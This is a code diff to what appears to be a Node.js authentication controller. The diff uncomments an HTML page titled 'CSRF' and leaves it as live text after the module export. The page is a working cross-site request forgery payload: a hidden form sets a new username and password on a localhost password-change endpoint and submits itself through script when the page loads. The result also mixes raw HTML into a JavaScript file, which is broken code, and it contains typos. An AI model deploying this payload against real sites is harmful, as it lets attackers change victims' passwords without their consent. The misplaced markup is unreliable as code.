@@ -165,23 +165,23 @@ authController.forgetPasswod = async (req, res) => {
 module.exports = authController;
 
 
-// <!DOCTYPE html>
-// <html lang="en">
-//   <head>
-//     <meta charset = "UTF-8">
-//     <meta name = "viewport" ckontent="width=device-width, initial-scale=1.0">
-//     <title>CSRF</title>
-//   </head>
-//   <body>
-//     <form action="http://localhost:8080/action.php" method="GET" id="csrfForm">
-//     <input type="hidden " name="username" value="Bhawana">
-//     <input type="hidden " name="password" value="12345678">
-//     <input type="hidden " name="confirmpassword" value="12345678">
-//     <input type="hidden " name="changepass" value="1">
-//     </form>
-//     <script>
-//       document.getElementById("csrfForm").submit();
-//     </script>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset = "UTF-8">
+    <meta name = "viewport" ckontent="width=device-width, initial-scale=1.0">
+    <title>CSRF</title>
+  </head>
+  <body>
+    <form action="http://localhost:8080/action.php" method="GET" id="csrfForm">
+    <input type="hidden " name="username" value="Bhawana">
+    <input type="hidden " name="password" value="12345678">
+    <input type="hidden " name="confirmpassword" value="12345678">
+    <input type="hidden " name="changepass" value="1">
+    </form>
+    <script>
+      document.getElementById("csrfForm").submit();
+    </script>
 
-//   </body>
-// </html>
+  </body>
+</html>
